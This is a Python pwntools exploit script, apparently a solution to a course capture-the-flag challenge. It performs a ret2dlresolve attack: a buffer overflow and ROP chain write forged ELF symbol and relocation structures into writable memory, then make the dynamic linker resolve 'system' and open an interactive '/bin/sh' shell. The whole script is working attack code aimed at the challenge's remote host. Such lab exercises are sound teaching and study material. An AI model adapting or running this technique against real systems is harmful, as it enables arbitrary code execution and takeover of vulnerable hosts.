from pwn import *

context.update(
    arch="amd64",
    endian="little",
    log_level="debug",
    os="linux",
    terminal=["st"]
)

def start(binary):
    gs = '''
        init-pwndbg
        set context-sections stack regs disasm
        set show-compact-regs on
        set resolve-heap-via-heuristic on
        b *0x40118d
    '''

    if args.GDB:
        return gdb.debug(binary, gdbscript=gs)
    elif args.REMOTE:
        return remote("cse4850-ret2dlresolve-1.chals.io", 443, ssl=True, sni="cse4850-ret2dlresolve-1.chals.io")
    else:
        return process(binary)
def align(addr):
    return (0x18 - (addr) % 0x18)

def exploit(p, e, r):
    pad = b"A" * 16

    writable_mem = 0x404e10
    #writable_mem = 0x404e08

    symbtab = 0x4003d0
    strtab = 0x4004a8
    jmprel = 0x4005d0

    init_plt = 0x401020


    fake_strtab = writable_mem
    fake_symtab = writable_mem + 0x18
    fake_rel = writable_mem + 0x38
    fake_args = writable_mem + 0x50

    print((fake_rel - jmprel) % 0x18)
    dl_resolve_index = int((fake_rel - jmprel) / 24)
    r_info = int((fake_symtab - symbtab) / 0x18) << 32 | 0x7
    st_shndex = fake_strtab - strtab
    print(hex(r_info))
    print(hex(dl_resolve_index))
    print(hex(st_shndex))

    mov_rdi = p64(0x401190)
    pop_r10 = p64(0x40118d)
    ret = p64(0x401016)
    gets_plt = p64(e.plt["gets"])

    chain = ret + pop_r10 + p64(writable_mem) + mov_rdi
    chain += gets_plt

    chain += pop_r10 + p64(fake_args) + mov_rdi
    chain += p64(init_plt)
    chain += p64(dl_resolve_index)


    p.sendline(pad + chain)
    pause()

    # Symbol Name
    chain = b"system\x00\x00" # st_name
    chain += p64(0) # st_info
    chain += p64(0) # st_other

    # Elf64_Sym Structure
    chain += p64(st_shndex) # st_shndex
    chain += p64(0) # st_value
    chain += p64(0) # st_size
    chain += p64(0) # padding

    # Elf64_Rel Structure
    chain += p64(writable_mem) # r_offset
    chain += p64(r_info) # r_info
    chain += p64(0) # padding

    # Arguments
    chain += b"/bin/sh\x00"

    p.sendline(chain)
    p.interactive()


    return None


if __name__ == "__main__":
    file = args.BIN
    p = start(file)
    e = context.binary = ELF(file)
    r = ROP(e)

    exploit(p, e, r)
